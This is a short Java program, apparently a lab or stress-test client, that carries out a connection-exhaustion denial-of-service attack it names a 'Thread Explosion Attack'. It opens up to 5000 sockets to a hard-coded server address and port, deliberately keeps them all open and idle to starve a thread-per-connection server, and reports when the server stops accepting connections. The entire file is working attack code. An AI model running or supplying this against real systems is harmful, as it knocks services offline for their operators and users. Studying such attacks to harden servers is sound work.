import java.net.*;
import java.util.*;

public class ThreadKillerClient {
    private static final String SERVER_ADDRESS = "10.0.101.82"; // Your server IP
    private static final int SERVER_PORT = 12345;
    private static final int ATTACK_SIZE = 5000; // Aim for 5000+ active threads
    private static List<Socket> sockets = new ArrayList<>(); // Keep references so GC doesn't close them

    public static void main(String[] args) {
        System.out.println("Starting Thread Explosion Attack...");

        for (int i = 0; i < ATTACK_SIZE; i++) {
            try {
                Socket socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
                sockets.add(socket); // Store it so it stays open!
                System.out.println("Connected bot #" + i);
                
                // CRITICAL: Do NOT close the socket. 
                // Do NOT send data. Just sit there.
                
            } catch (Exception e) {
                System.out.println("Server died at connection #" + i);
                break;
            }
        }
    }
}